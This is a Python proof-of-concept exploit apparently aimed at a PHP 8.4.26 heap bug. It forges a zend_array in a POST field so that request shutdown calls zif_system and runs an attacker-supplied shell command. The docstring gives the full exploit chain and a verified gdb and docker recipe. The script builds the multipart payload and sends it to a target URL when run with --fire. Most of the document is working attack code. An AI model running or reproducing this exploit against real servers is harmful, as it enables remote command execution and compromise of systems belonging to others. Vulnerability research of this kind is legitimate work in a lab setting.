#!/usr/bin/env python3
# INDEX: stale $_FILES bucket value-channel -> forged zend_array -> system(cmd) | cli; addresses from gdb/proc seed
"""CVE-2026-109618 stale-bucket arm -> command execution (value channel).

Composes the binary-safe value channel (primitives/groom/stale_bucket_value_seat)
with the fake-zend_array forge (primitives/encode/zend_array_forge):

  1. A live $_POST['fav'] field carries a forged zend_array (gc.refcount=1,
     IS_ARRAY, pDestructor = zif_system, fake execute_data + inline command
     zend_string). Its persistent value buffer is groomed to land at address S.
  2. The value channel seats the stale $_FILES bucket's val.value = S (full
     8 bytes, NUL-tolerant) with a refcounted type.
  3. Request shutdown: zend_array_destroy walks the stale bucket -> GC_DELREF(S)
     hits 0 -> rc_dtor_func(S) -> zend_array_destroy(S) -> pDestructor path ->
     zif_system -> php_exec -> popen(cmd). The command runs to completion
     (blocking popen), then the worker SIGSEGVs in php_exec.

Stage: VERIFIED gdb-seeded (ASLR off) on 8.4.26 `php -S`. `id` written as root
to a file, independently reproduced; see verify note below. NOT pure-HTTP /
offset-free: S (heap) and zif_system (PIE text) are supplied, deterministic
only under ASLR-off (gdb `disable-randomization`, or `setarch -R`), same
seeding class as the repo's other realized chains (README: "per-boot addresses
from a gdb replica or /proc"). Wiring an HTTP leak for S + zif_system is the
remaining step to ASLR tolerance.

Default is decide/dry-run (prints the body and the required addresses); --fire
actually POSTs. Fire crashes the worker -- use your own disposable container.

Verified recipe (dedicated gdb container, ASLR off via gdb):
    docker run -d --rm --name p2s-sbg -p 18980:80 <php:8.4.26-cli + gdb> \\
        sleep infinity
    # launch php -S under: gdb -batch -ex 'handle SIGPIPE nostop noprint pass' \\
    #   -ex 'set detach-on-fork on' -ex run --args php -d memory_limit=16M ... -S 0.0.0.0:80
    python3 -I poc/chains/stale_bucket_value_rce.py http://127.0.0.1:18980 \\
        --fire --zif 0x555555908a70 --addr 0x7ffff62641d8 \\
        --cmd 'id > /tmp/pwn' --pad 320 --nflood 50
"""
from __future__ import annotations

import argparse
import os
import sys
import time

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import http  # noqa: E402
from common.multipart import PHP2SHELL_BOUNDARY_B as BND  # noqa: E402
from primitives.encode.zend_array_forge import forge_zend_array  # noqa: E402
from primitives.groom.stale_bucket_value_seat import seat_body  # noqa: E402


def build_fire(addr, zif, cmd, pad=320, nflood=50, forge_size=384):
    """Wire bytes: forged zend_array (at S=addr) carried in $_POST['fav'] +
    the value-channel seat routing the stale bucket's val.value to S."""
    fav = forge_zend_array(addr, zif, cmd if isinstance(cmd, bytes) else cmd.encode(),
                           size=forge_size)
    return seat_body(addr, pad, padsz=16384, nflood=nflood, floodsz=288, fav=fav)


def alive(base, path, timeout=5):
    s, _ = http(base + path, timeout=timeout)
    return s == 200


def run(a):
    base = a.url.rstrip("/")
    body = build_fire(a.addr, a.zif, a.cmd, a.pad, a.nflood)
    ct = "multipart/form-data; boundary=" + BND.decode()
    print(f"[stale_bucket_value_rce] S(addr)={a.addr:#x} zif_system={a.zif:#x} "
          f"pad={a.pad} nflood={a.nflood} cmd={a.cmd!r}")
    print(f"[stale_bucket_value_rce] body {len(body)} bytes ({len(body)/1048576:.2f} MiB)")
    if not a.fire:
        print("[stale_bucket_value_rce] decide-only (no POST). Re-run with --fire "
              "against your own disposable container to execute.")
        return 0
    if not alive(base, a.alive_path):
        print(f"[stale_bucket_value_rce] target not answering {a.alive_path} before fire; abort")
        return 2
    t0 = time.time()
    s, _ = http(base + a.path, data=body,
                headers={"Content-Type": ct, "Content-Length": str(len(body))},
                timeout=120)
    time.sleep(1.0)
    al = alive(base, a.alive_path)
    print(f"[stale_bucket_value_rce] HTTP={s}  worker {'alive' if al else 'DEAD'}  "
          f"{time.time()-t0:.1f}s  (command runs before the post-exec crash; "
          f"confirm its side effect out of band)")
    return 0


def main():
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("url")
    p.add_argument("--fire", action="store_true", help="actually POST (crashes the worker)")
    p.add_argument("--zif", type=lambda x: int(x, 0), default=0x555555908a70,
                   help="zif_system address (PIE text, ASLR-off deterministic)")
    p.add_argument("--addr", type=lambda x: int(x, 0), default=0x7ffff62641d8,
                   help="S: heap address the forged array lands at / val.value points to")
    p.add_argument("--cmd", default="id > /tmp/pwn")
    p.add_argument("--pad", type=int, default=320)
    p.add_argument("--nflood", type=int, default=50)
    p.add_argument("--path", default="/poc.php")
    p.add_argument("--alive-path", default="/ping.php")
    sys.exit(run(p.parse_args()))


if __name__ == "__main__":
    main()
